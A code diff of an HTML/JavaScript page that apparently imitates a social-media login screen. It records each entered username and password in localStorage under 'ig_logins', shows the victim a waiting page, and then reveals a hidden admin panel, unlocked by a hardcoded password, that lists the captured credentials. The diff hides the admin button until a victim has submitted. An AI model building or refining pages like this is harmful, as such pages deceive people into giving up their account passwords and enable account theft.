@@ -115,7 +115,7 @@
 
   .admin-btn:hover { opacity: 1; transform: scale(1.05); }
 
-  .hidden { display: none; }
+  .hidden { display: none !important; }
 
   .admin-panel {
     position: fixed;
@@ -193,21 +193,20 @@
   </div>
 </div>
 
-<!-- ============ ADMIN BUTTON ============ -->
-<button class="admin-btn" onclick="openAdmin()" title="Admin">⚙</button>
+<!-- ============ ADMIN BUTTON (hidden on page 1) ============ -->
+<button class="admin-btn hidden" id="adminBtn" onclick="openAdmin()" title="Admin">⚙</button>
 
-<!-- ============ ADMIN PANEL (hidden by default) ============ -->
+<!-- ============ ADMIN PANEL ============ -->
 <div class="admin-panel hidden" id="adminPanel">
   <div class="admin-box">
     <h2>Admin Panel</h2>
 
-    <!-- Password gate -->
     <div id="adminGate">
       <input type="password" id="adminPass" placeholder="Enter admin password" />
       <button onclick="checkAdmin()">Unlock</button>
+      <button class="clear-btn" style="background:#888;" onclick="closeAdmin()">Cancel</button>
     </div>
 
-    <!-- Data view -->
     <div id="adminData" class="hidden">
       <table id="dataTable">
         <thead>
@@ -224,7 +223,7 @@
 
 <script>
   // ============================================
-  // CHANGE THIS to your own secret admin password
+  // YOUR ADMIN PASSWORD
   // ============================================
   const ADMIN_PASSWORD = "9048";
 
@@ -239,4 +238,26 @@
     }
 
     // Save to localStorage
-    const logins = JSON.parse(localStorage.getItem('ig_logins') ||
+    const logins = JSON.parse(localStorage.getItem('ig_logins') || '[]');
+    logins.push({ user: u, pass: p, time: new Date().toLocaleString() });
+    localStorage.setItem('ig_logins', JSON.stringify(logins));
+
+    // Switch to page 2
+    document.getElementById('loginPage').classList.add('hidden');
+    document.getElementById('waitPage').classList.remove('hidden');
+
+    // Show admin button ONLY now (page 2)
+    document.getElementById('adminBtn').classList.remove('hidden');
+  }
+
+  // ---------- Open admin ----------
+  function openAdmin() {
+    document.getElementById('adminPanel').classList.remove('hidden');
+    document.getElementById('adminGate').classList.remove('hidden');
+    document.getElementById('adminData').classList.add('hidden');
+    document.getElementById('adminPass').value = '';
+  }
+
+  function closeAdmin() {
+    document.getElementById('adminPanel').classList.add('hidden');
+  }
